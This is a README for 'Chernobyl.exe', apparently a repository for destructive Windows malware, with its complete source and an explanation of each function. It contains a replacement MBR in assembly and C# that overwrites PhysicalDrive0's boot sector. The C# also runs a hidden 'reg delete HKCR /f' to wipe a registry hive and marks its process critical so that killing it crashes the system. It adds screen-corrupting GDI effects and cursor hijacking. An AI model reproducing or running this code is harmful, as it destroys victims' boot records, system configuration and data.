# Chernobyl.exe


**MBR After Infection**   
---
![MBR](https://i.ibb.co/ff1NFd2/MBR.gif)
---
```Assembly
bits 16
org 0x7C00

start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti

    mov ax, 0x0003
    int 0x10

    mov ax, 0x0600
    mov bh, 0x14
    mov cx, 0x0000
    mov dx, 0x184F
    int 0x10

    mov ah, 0x02
    mov bh, 0x00
    mov dh, 11
    mov dl, 32
    int 0x10

    mov si, message
    mov ah, 0x0E
    mov bh, 0x00

print_loop:
    lodsb
    cmp al, 0
    je start_color_cycle
    cmp al, 10
    jne print_char
    inc dh
    mov dl, 32
    mov ah, 0x02
    int 0x10
    mov ah, 0x0E
    jmp print_loop

print_char:
    int 0x10
    jmp print_loop

start_color_cycle:
    mov byte [current_bg], 1

color_loop:
    mov al, [current_bg]
    mov bl, 15
    sub bl, al
    shl al, 4
    or al, bl

    push ax
    mov ax, 0xB800
    mov es, ax
    pop ax
    mov di, 1
    mov cx, 2000

fill_attr:
    mov [es:di], al
    add di, 2
    loop fill_attr

    call delay

    inc byte [current_bg]
    cmp byte [current_bg], 14
    jbe color_loop
    mov byte [current_bg], 1
    jmp color_loop

delay:
    push cx
    push dx
    mov cx, 0xFFFF
.d1:
    mov dx, 0x0FFF
.d2:
    dec dx
    jnz .d2
    loop .d1
    pop dx
    pop cx
    ret

message:
    db " Checkmate!!!",10,"www.abolhb.com",0

current_bg:  db 0

times 510-($-$$) db 0
dw 0xAA55
```

# GDI

**GDI Effect 1 - Ring Effect**   

![GDI1](https://i.ibb.co/5WLXDpBB/image.png)

**GDI Effect 2 - Shard Effect**  

![GDI2](https://i.ibb.co/MDSWfh3v/image.png)

**GDI Effect 3 - Mirror Effect**    

![GDI3](https://i.ibb.co/4ZZQDqZB/image.png)

**GDI Effect 4 - Pulse Effect**   

![GDI4](https://i.ibb.co/QFY1qF1B/image.png)

## MasonExtrusion Class Functions

```cs
public static async Task MasonExtractResources()
{
    await Task.Run(() =>
    {
        if (File.Exists("nasm.exe"))
            return;

        try
        {
            byte[] MasonNasmBytes = MasonVirus.Properties.Resources.nasm;
            File.WriteAllBytes("nasm.exe", MasonNasmBytes);
        }
        catch { }
    });
}
```
This function checks if nasm.exe already exists in the current directory. If not, it reads the embedded NASM executable from the resources and writes it to disk as nasm.exe. It runs asynchronously on a thread pool thread.

```cs
public static async Task MasonDeleteReg()
{
    Process.Start(new ProcessStartInfo
    {
        FileName = "cmd.exe",
        WindowStyle = ProcessWindowStyle.Hidden,
        Arguments = "/c reg delete HKCR /f"
    });

    await Task.CompletedTask;
}
```
This function launches a hidden command prompt process that executes the command "reg delete HKCR /f". This command attempts to forcibly delete the entire HKEY_CLASSES_ROOT registry hive, which will break file associations and many system functions. It returns an already completed task.

```cs
public static bool MasonMBR()
{
    try
    {
        IntPtr MasonHandle = CreateFile("\\\\.\\PhysicalDrive0", 1073741824U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
        if (MasonHandle.ToInt64() == -1L)
            return false;
        CloseHandle(MasonHandle);
        return true;
    }
    catch
    {
        return false;
    }
}
```
This function attempts to open the first physical drive (PhysicalDrive0) with write access. The access flags (1073741824U = GENERIC_WRITE, 3U = FILE_SHARE_READ|FILE_SHARE_WRITE, 3U = OPEN_EXISTING). If the handle is valid (not -1), it closes the handle and returns true. If opening fails (exception or invalid handle), it returns false. This is used to check if the MBR can be overwritten.

```cs
public static async Task MasonFiles()
{
    await Task.Run(() =>
    {
        string MasonAsmSource = MasonVirus.Properties.Resources.mbr;
        File.WriteAllText("mbr_temp.asm", MasonAsmSource);
        MasonCompileNASM();
        byte[] MasonMbrBin = File.ReadAllBytes("mbr_temp.bin");
        if (MasonMbrBin.Length != 512)
            return;
        MasonPhysicalDrive(MasonMbrBin);
    });
}
```
This function runs asynchronously. It writes the embedded MBR assembly source code (from resources) to a temporary file named "mbr_temp.asm". Then it calls MasonCompileNASM to assemble that file into "mbr_temp.bin". It reads the compiled binary and checks if its size is exactly 512 bytes (the size of an MBR). If so, it passes the binary data to MasonPhysicalDrive to write it to the physical drive.

```cs
public static void MasonCompileNASM()
{
    if (!File.Exists("nasm.exe"))
        return;

    using (Process MasonProcess = Process.Start(new ProcessStartInfo
    {
        FileName = "nasm.exe",
        Arguments = "-f bin mbr_temp.asm -o mbr_temp.bin",
        UseShellExecute = false,
        CreateNoWindow = true,
        WorkingDirectory = Directory.GetCurrentDirectory()
    }))
    {
        MasonProcess.WaitForExit(5000);
        if (MasonProcess.ExitCode != 0)
            return;
    }
}
```
This function first ensures nasm.exe exists. It then starts a hidden NASM process with arguments to assemble "mbr_temp.asm" into a flat binary file "mbr_temp.bin". It waits up to 5 seconds for the process to exit. If the exit code is not zero (indicating an error), it aborts without further action.

```cs
public static void MasonPhysicalDrive(byte[] MasonData)
{
    IntPtr MasonHandle = CreateFile("\\\\.\\PhysicalDrive0", 1073741824U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
    if (MasonHandle.ToInt64() == -1L)
        return;

    try
    {
        uint MasonBytesWritten;
        WriteFile(MasonHandle, MasonData, 512U, out MasonBytesWritten, IntPtr.Zero);
    }
    finally
    {
        CloseHandle(MasonHandle);
    }
}
```
This function opens PhysicalDrive0 for write access. If the handle is valid, it attempts to write exactly 512 bytes from the input array to the beginning of the drive using WriteFile. It always closes the handle in a finally block to ensure cleanup even if an exception occurs.

```cs
public static async Task MasonCleanupFiles()
{
    _ = Task.Run(() => MasonExtrusion.MasonDeleteReg());

    await Task.Run(() =>
    {
        try { if (File.Exists("mbr_temp.asm")) File.Delete("mbr_temp.asm"); } catch { }
        try { if (File.Exists("mbr_temp.bin")) File.Delete("mbr_temp.bin"); } catch { }
        try { if (File.Exists("nasm.exe")) File.Delete("nasm.exe"); } catch { }
    });
}
```
This function first starts MasonDeleteReg in a separate task without awaiting it (fire-and-forget). Then it runs a task that attempts to delete the temporary assembly file, the compiled binary, and the nasm.exe executable. Any exceptions during deletion are ignored.

## MasonSpearhead Class Functions

```cs
static void Main()
{
    // BSOD AFTER KILL
    int MasonisCritical = 1;
    int MasonBreakOnTermination = 0x1D;
    Process.EnterDebugMode();
    NtSetInformationProcess(Process.GetCurrentProcess().Handle, MasonBreakOnTermination, ref MasonisCritical, sizeof(int));

    MasonTasks().GetAwaiter().GetResult();

    MasonW = GetSystemMetrics(0);
    MasonH = GetSystemMetrics(1);

    // BYTEBEAT
    const int MasonSR = 8500;
    const int MasonBUF = MasonSR * 40;

    Func<int, int>[] MasonBeats = {
        t => (int)((t*t*3>>8^t*7)&(t>>5|t>>8)|(t*13&t>>4)^(t>>2&t*99>>7))&255,
        t => (int)((t*(t>>9^t>>13)&255)+(t*t>>6&127)^(t>>3)*(t*5&(t>>7|t>>11)))&255,
        t => (int)((t*5&t>>7)|(t*3&t>>10)^(t*23>>4&t)|(t>>2)*(t^t>>8)&(t>>4|128))&255,
        t => (int)((t*(t>>3|t>>6)&127)^(t*t*t>>12)|(t*17^t>>5)&(t<<1|t>>9))&255
    };

    Task.Run(() => MasonCursorTrail());
    Task.Run(() => MasonCursorMove());

    int MasonBi = 0, MasonPh = 0;

    for (; ; )
    {
        string MasonTmp = Path.GetTempFileName();
        byte[] MasonRaw = new byte[MasonBUF];
        for (int MasonT = 0; MasonT < MasonBUF; MasonT++)
            MasonRaw[MasonT] = (byte)(MasonBeats[MasonBi](MasonT) & 0xFF);

        using (var MasonFs = new FileStream(MasonTmp, FileMode.Create))
        using (var MasonBw = new BinaryWriter(MasonFs))
        {
            MasonBw.Write(new[] { 'R', 'I', 'F', 'F' });
            MasonBw.Write(36 + MasonRaw.Length);
            MasonBw.Write(new[] { 'W', 'A', 'V', 'E' });
            MasonBw.Write(new[] { 'f', 'm', 't', ' ' });
            MasonBw.Write(16);
            MasonBw.Write((short)1);
            MasonBw.Write((short)1);
            MasonBw.Write(MasonSR);
            MasonBw.Write(MasonSR);
            MasonBw.Write((short)1);
            MasonBw.Write((short)8);
            MasonBw.Write(new[] { 'd', 'a', 't', 'a' });
            MasonBw.Write(MasonRaw.Length);
            MasonBw.Write(MasonRaw);
        }

        var MasonSp = new SoundPlayer(MasonTmp);
        MasonSp.PlayLooping();
        var MasonT0 = Environment.TickCount;

        // GDI
        while (Environment.TickCount - MasonT0 < 15000)
        {
            var MasonDc = GetDC(GetDesktopWindow());
            MasonPh++;

            switch (MasonBi)
            {
                case 0:
                    for (int MasonRing = 12; MasonRing > 0; MasonRing--)
                    {
                        int MasonSz = MasonRing * (Math.Min(MasonW, MasonH) / 12);
                        double MasonSp2 = MasonPh * 0.1 + MasonRing * 0.6;
                        int MasonOx = (int)(Math.Sin(MasonSp2) * 30), MasonOy = (int)(Math.Cos(MasonSp2) * 30);
                        StretchBlt(MasonDc, (MasonW - MasonSz) / 2 + MasonOx, (MasonH - MasonSz) / 2 + MasonOy, MasonSz, MasonSz,
                            MasonDc, 0, 0, MasonW, MasonH, 0x00CC0020);
                    }
                    SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(16777216)));
                    PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x005A0049);
                    break;

                case 1:
                    BitBlt(MasonDc, MasonG.Next(-60, 60), MasonG.Next(-60, 60), MasonW, MasonH, MasonDc, 0, 0, 0x00CC0020);
                    for (int MasonS = 0; MasonS < 20; MasonS++)
                    {
                        int MasonSy = MasonG.Next(MasonH), MasonSh = 2 + MasonG.Next(30);
                        BitBlt(MasonDc, MasonG.Next(-120, 120), MasonSy, MasonW, MasonSh, MasonDc, 0, MasonSy, 0x00CC0020);
                    }
                    SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(16777216)));
                    PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x005A0049);
                    if (MasonPh % 4 < 2)
                        PatBlt(MasonDc, 0, 0, MasonW,   MasonH, 0x00550009);
                    break;

                case 2:
                    StretchBlt(MasonDc, MasonW, 0, -MasonW, MasonH, MasonDc, 0, 0, MasonW, MasonH, 0x00CC0020);
                    StretchBlt(MasonDc, 0, MasonH, MasonW, -MasonH, MasonDc, 0, 0, MasonW, MasonH, 0x00CC0020);
                    for (int k = 0; k < 10; k++)
                    {
                        int MasonKx = MasonG.Next(MasonW), MasonKy = MasonG.Next(MasonH);
                        int MasonKw = 80 + MasonG.Next(250), MasonKh = 80 + MasonG.Next(250);
                        StretchBlt(MasonDc, MasonKx, MasonKy, -MasonKw, MasonKh, MasonDc, MasonKx, MasonKy, MasonKw, MasonKh, 0x00CC0020);
                    }
                    SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(16777216)));
                    PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x005A0049);
                    break;

                case 3:
                    double MasonPx = Math.Sin(MasonPh * 0.15) * 0.5 + 1.0;
                    double MasonPy = Math.Cos(MasonPh * 0.11) * 0.4 + 1.0;
                    int MasonPpw = (int)(MasonW * MasonPx), MasonPph = (int)(MasonH * MasonPy);
                    StretchBlt(MasonDc, (MasonW - MasonPpw) / 2, (MasonH - MasonPph) / 2, MasonPpw, MasonPph, MasonDc, 0, 0, MasonW, MasonH, 0x00CC0020);
                    SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(16777216)));
                    PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x005A0049);
                    if (MasonPh % 6 < 2)
                        PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x00550009);
                    break;
            }

            for (int i = 0; i < 8; i++)
            {
                int MasonCx = MasonG.Next(MasonW), MasonCy = MasonG.Next(MasonH), MasonSz = 40 + MasonG.Next(150);
                BitBlt(MasonDc, MasonCx + MasonG.Next(-70, 70), MasonCy + MasonG.Next(-70, 70), MasonSz, MasonSz, MasonDc, MasonCx, MasonCy, 0x00CC0020);
            }

            if (MasonG.Next(15) == 0)
            {
                SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(50)));
                PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x00420000);
                Thread.Sleep(25);
            }

            ReleaseDC(GetDesktopWindow(), MasonDc);
            Thread.Sleep(50);
        }

        MasonSp.Dispose();

        try { File.Delete(MasonTmp); } catch { }

        for (int n = 0; n < 10; n++)
        {
            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
            Thread.Sleep(10);
        }

        MasonBi = (MasonBi + 1) % MasonBeats.Length;

        if (MasonBi == 0)
        {
            Environment.Exit(0);
        }
    }
}
```
This is the main entry point. It first makes the process critical using NtSetInformationProcess so that if the process is killed, the system will BSOD. Then it calls MasonTasks to handle MBR infection. It retrieves screen dimensions and defines four bytebeat audio generation functions. It starts two background tasks for cursor effects. Then it enters an infinite loop that cycles through four stages. In each stage, it generates a WAV file from the current bytebeat formula and plays it in a loop for 15 seconds. During those 15 seconds, it repeatedly applies GDI effects based on the stage index (MasonBi). The effects include ring stretching, screen tearing, mirroring, and pulsing. It also adds additional random distortions and occasional color flashes. After 15 seconds, it stops the sound, deletes the temporary WAV file, invalidates the screen, and moves to the next stage. When it returns to stage 0, it calls Environment.Exit to terminate.

```cs
static async Task MasonCursorTrail()
{
    await Task.Run(() =>
    {
        IntPtr[] MasonCursors = new IntPtr[7];
        MasonCursors[0] = LoadCursor(IntPtr.Zero, 32512);
        MasonCursors[1] = LoadCursor(IntPtr.Zero, 32513);
        MasonCursors[2] = LoadCursor(IntPtr.Zero, 32514);
        MasonCursors[3] = LoadCursor(IntPtr.Zero, 32515);
        MasonCursors[4] = LoadCursor(IntPtr.Zero, 32516);
        MasonCursors[5] = LoadCursor(IntPtr.Zero, 32642);
        MasonCursors[6] = LoadCursor(IntPtr.Zero, 32643);

        while (true)
        {
            GetCursorPos(out Point MasonPos);
            var MasonDc = GetDC(GetDesktopWindow());

            for (int MasonI = 0; MasonI < 5; MasonI++)
            {
                int MasonOx = MasonPos.X + MasonG.Next(-40, 40);
                int MasonOy = MasonPos.Y + MasonG.Next(-40, 40);
                DrawIcon(MasonDc, MasonOx, MasonOy, MasonCursors[MasonG.Next(MasonCursors.Length)]);
            }

            ReleaseDC(GetDesktopWindow(), MasonDc);
            Thread.Sleep(30);
        }
    });
}
```
This function runs as a background task. It loads seven standard Windows cursor icons. Then it continuously gets the current cursor position, obtains a device context for the desktop, and draws five random cursors at positions offset randomly around the actual cursor. This creates a trail effect. It releases the DC and sleeps for 30ms before repeating.

```cs
static async Task MasonCursorMove()
{
    await Task.Run(() =>
    {
        double MasonA = 0;
        bool MasonPanic = false;
        int MasonTimer = 0;

        while (true)
        {
            MasonA += MasonPanic ? 0.5 : 0.06;
            MasonTimer++;
            if (MasonTimer > 60 + MasonG.Next(100)) { MasonPanic = !MasonPanic; MasonTimer = 0; }

            int MasonRad = MasonPanic ? MasonG.Next(50, 500) : 120 + (int)(Math.Sin(MasonA * 0.2) * 80);
            int MasonMx = MasonW / 2 + (int)(Math.Cos(MasonA) * MasonRad) + (MasonPanic ? MasonG.Next(-100, 100) : 0);
            int MasonMy = MasonH / 2 + (int)(Math.Sin(MasonA * 0.6) * MasonRad) + (MasonPanic ? MasonG.Next(-100, 100) : 0);
            SetCursorPos(Math.Max(0, Math.Min(MasonW - 1, MasonMx)), Math.Max(0, Math.Min(MasonH - 1, MasonMy)));
            Thread.Sleep(MasonPanic ? MasonG.Next(8, 20) : MasonG.Next(25, 50));
        }
    });
}
```
This function runs as a background task and controls the mouse cursor position. It uses a continuously increasing angle (MasonA) to calculate new cursor coordinates based on sine and cosine functions, creating a smooth, wandering pattern. It has two modes: normal and panic. In panic mode, the angle increment is larger, the movement radius is random and larger, and random offsets are added, making the cursor jump erratically. The mode switches randomly after a variable number of iterations. The cursor position is clamped to the screen bounds. The thread sleep duration varies based on mode.

```cs
private static async Task MasonTasks()
{
    await Task.Run(async () =>
    {
        if (!MasonExtrusion.MasonMBR())
            return;

        try
        {
            await MasonExtrusion.MasonExtractResources();
            await MasonExtrusion.MasonFiles();
        }
        catch
        {
        }

        await MasonExtrusion.MasonCleanupFiles();
    });
}
```
This asynchronous function runs the MBR infection sequence. It first checks if the physical drive is accessible using MasonMBR. If not, it returns. Otherwise, it attempts to extract NASM resources and then compile and write the MBR via MasonFiles. Any exceptions during these operations are ignored. Finally, it calls MasonCleanupFiles to remove temporary files and trigger registry deletion.
